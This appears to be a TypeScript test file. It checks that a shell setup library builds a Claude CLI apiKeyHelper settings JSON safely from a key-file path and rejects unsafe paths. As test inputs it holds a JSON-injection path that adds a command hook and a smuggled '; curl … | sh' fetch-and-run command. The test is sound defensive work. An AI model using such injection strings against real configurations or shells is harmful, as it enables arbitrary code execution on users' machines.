// R1264e D2, R1264f D2: lib.sh's login proof (claude_api_check) gives an API-key login's apiKeyHelper to claude as
// --settings. Its value is built by a JSON encoder from the key path, shell-quoted, after the path is checked again
// where it is used: never by putting a variable inside the JSON's text, where a path that closes the string adds keys
// (a hook the real CLI runs). sudo, timeout, claude and the key-file reader are stand-ins: the stub claude records
// its argv.
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { spawnSync } from 'node:child_process';
import { chmodSync, mkdtempSync, readFileSync, rmSync, writeFileSync, existsSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { repoRoot } from './helpers.js';

const posix = process.platform !== 'win32';

/** claude_api_check run with `key` as the key file claude_key_file returns: its exit, its output and claude's argv. */
function proof(key: string | null): { status: number | null; out: string; argv: string[] | null } {
  const t = mkdtempSync(join(tmpdir(), 'login-proof-'));
  try {
    const bin = join(t, 'bin');
    spawnSync('mkdir', ['-p', bin]);
    writeFileSync(join(bin, 'claude'), `#!/usr/bin/env node\nrequire('node:fs').writeFileSync(${JSON.stringify(join(t, 'argv.json'))}, JSON.stringify(process.argv.slice(2)));\nconsole.log(JSON.stringify({ type: 'result', subtype: 'success', is_error: false, result: 'ok' }));\n`);
    chmodSync(join(bin, 'claude'), 0o755);
    // timeout <seconds> <command…>: run it (macOS has no timeout).
    writeFileSync(join(bin, 'timeout'), '#!/bin/sh\nshift\nexec "$@"\n');
    chmodSync(join(bin, 'timeout'), 0o755);
    const script = [
      'source "$1"',
      // sudo -H -u <user> <command…>: run it as this user.
      'sudo() { shift 3; "$@"; }',
      'claude_key_file() { [ -n "${PROOF_KEY+x}" ] && printf %s "$PROOF_KEY"; return 0; }',
      'claude_api_check tester "$2"',
    ].join('\n');
    const env: NodeJS.ProcessEnv = { PATH: `${bin}:${process.env.PATH ?? '/usr/bin:/bin'}`, HOME: t };
    if (key !== null) env.PROOF_KEY = key;
    const r = spawnSync('bash', ['-c', script, '_', join(repoRoot, 'scripts', 'setup', 'lib.sh'), join(t, 'cfg')], { encoding: 'utf8', env });
    const argv = existsSync(join(t, 'argv.json')) ? (JSON.parse(readFileSync(join(t, 'argv.json'), 'utf8')) as string[]) : null;
    return { status: r.status, out: `${r.stdout}${r.stderr}`, argv };
  } finally {
    rmSync(t, { recursive: true, force: true });
  }
}
const settingsOf = (argv: string[]) => argv[argv.indexOf('--settings') + 1]!;

test('R1264e/f D2: the login proof passes an API-key login\'s apiKeyHelper as one JSON key, built by an encoder, and {} with no key', { skip: !posix }, () => {
  const keyed = proof('/home/user/.config/worklane/key');
  assert.equal(keyed.status, 0, keyed.out);
  assert.deepEqual(JSON.parse(settingsOf(keyed.argv!)), { apiKeyHelper: 'cat -- /home/user/.config/worklane/key' });
  assert.deepEqual(keyed.argv!.slice(-5), ['--settings', settingsOf(keyed.argv!), '--setting-sources', '', '--strict-mcp-config']);
  const none = proof(null);
  assert.equal(none.status, 0, none.out);
  assert.equal(settingsOf(none.argv!), '{}');
});

test('R1264e/f D2: a key path that would close the JSON string, or run as a command, is refused before claude starts', { skip: !posix }, () => {
  for (const key of ['/x","hooks":{"SessionStart":[{"hooks":[{"type":"command","command":"touch /tmp/HOOK"}]}]},"z":"', '/k; curl https://example.invalid | sh', '/a/../etc/key', 'relative/key']) {
    const r = proof(key);
    assert.notEqual(r.status, 0, `${key}: refused`);
    assert.equal(r.argv, null, `${key}: claude never started`);
    assert.match(r.out, /isn't a plain absolute path/);
  }
});
